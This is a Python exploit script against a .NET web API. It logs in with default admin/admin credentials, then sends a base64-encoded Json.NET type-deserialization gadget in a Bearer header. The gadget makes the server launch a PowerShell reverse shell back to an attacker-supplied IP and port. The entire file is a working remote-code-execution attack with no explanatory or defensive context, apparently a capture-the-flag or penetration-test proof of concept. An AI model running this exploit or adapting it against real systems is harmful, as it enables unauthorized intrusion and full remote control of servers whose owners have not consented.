#!/usr/bin/python

from dataclasses import dataclass
import requests
import sys, base64

def login(target):
    data = {
        "username":"admin",
        "password":"admin"
    }
    url = "http://%s/api/token"%(target)
    s = requests.Session()

    req = s.post(url, data=data)

    print(req.status_code)

    return s


def send_json(target, s):
    attackerip  = sys.argv[2]
    attackerport = sys.argv[3]

    json_data = "{"
    json_data += "'$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35', "
    json_data += "'MethodName':'Start',"
    json_data += "'MethodParameters':{"
    json_data += "'$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',"
    json_data += "'$values':['cmd', '/c powershell.exe \"$client = New-Object System.Net.Sockets.TCPClient(\\\'%s\\\', %s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \\\'PS \\\' + (pwd).Path + \\\'> \\\';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};\"']},"%(attackerip, attackerport)
    json_data += "'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}"
    json_data += "}"
    
    json_data = base64.b64encode(json_data.encode('utf-8'))
    url = url = "http://%s/api/Account"%(target)
    headers = {"Bearer": "%s"%(json_data.decode('utf-8'))}
    
    # proxies = {"http":"http://127.0.0.1:8080"}

    req = s.get(url, headers=headers)

    if b'System.Web.Http.Dispatcher.HttpControllerDispatcher.<SendAsync>d__15.MoveNext' in req.content:
        print('[+] Success! Check your nc listener!')

def main():
    if len(sys.argv) < 4:
        print("[+] Usage: %s target_IP attacker_IP attacker_Port"%(sys.argv[0]))
        exit()

    target = sys.argv[1]
    s = login(target)
    send_json(target, s)

if __name__ == "__main__":
    main()